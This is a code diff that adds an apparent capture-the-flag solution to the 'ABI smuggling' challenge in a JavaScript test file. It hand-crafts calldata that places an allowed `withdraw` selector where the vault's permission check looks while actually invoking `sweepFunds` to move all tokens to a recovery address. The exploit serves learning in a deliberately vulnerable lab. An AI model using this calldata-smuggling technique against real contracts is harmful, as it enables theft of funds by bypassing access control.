@@ -45,6 +45,37 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // make a call to `execute` in the vault contract with pure abi encoded data
+        const withdrawSelector = "0xd9caed12".slice(2).toLowerCase();
+        const sweepFundsSelector = "0x85fb709d".slice(2).toLowerCase();
+        const executeSelector = "0x1cff79cd".slice(2).toLowerCase();
+
+        await player.sendTransaction({
+            to: vault.address,
+            value: 0,
+            gasLimit: 30000000,
+            data: `0x${
+                executeSelector // selector (4 bytes)
+            }${
+                ethers.utils.hexZeroPad(vault.address, 32).slice(2).toLowerCase() // vault address (32 bytes)
+            }${
+                `${
+                    ethers.utils.hexZeroPad(100, 32).slice(2).toLowerCase() // data offset (location) value = 32 * 3 + 4 (32 bytes)
+                }${
+                    ethers.utils.hexZeroPad(0, 32).slice(2).toLowerCase() // zeros (32 bytes)
+                }${
+                    withdrawSelector // withdraw selector at location = 4 + (32 * 3) (4 bytes)
+                }${
+                    ethers.utils.hexZeroPad(68, 32).slice(2).toLowerCase() // data length value = 32 * 2 + 4 (32 bytes)
+                }${
+                    sweepFundsSelector // sweepFunds selector (4 bytes)
+                }${
+                    ethers.utils.hexZeroPad(recovery.address, 32).slice(2).toLowerCase() // recipient address (32 bytes)
+                }${
+                    ethers.utils.hexZeroPad(token.address, 32).slice(2).toLowerCase() // token address (32 bytes)
+                }`
+            }`
+        });
     });
 
     after(async function () {
